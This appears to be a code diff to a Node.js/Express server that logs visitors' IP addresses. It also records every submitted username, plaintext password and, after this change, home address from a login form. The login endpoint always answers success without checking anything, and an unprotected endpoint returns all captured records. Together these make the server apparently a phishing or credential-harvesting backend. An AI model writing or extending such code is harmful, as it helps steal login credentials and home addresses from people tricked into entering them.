@@ -13,33 +13,36 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     type TEXT,
     username TEXT,
     password TEXT,
+    address TEXT,
     ip TEXT,
     timestamp TEXT
 )`);
 
-function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-        [type, username, password, ip, timestamp]);
+    db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+        [type, username, password, address, ip, timestamp]);
 }
 
 // Record visits
 app.get('/', (req, res) => {
-    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
+// Login with Home Address
 app.post('/api/login', (req, res) => {
-    const { username, password } = req.body;
-    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    const { username, password, address } = req.body;
+    saveRecord('Login Attempt', username, password, address, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.json({ success: true });
 });
 
+// Get records
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
@@ -57,5 +60,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running with permanent storage`);
+    console.log(`🚀 Server running`);
 });
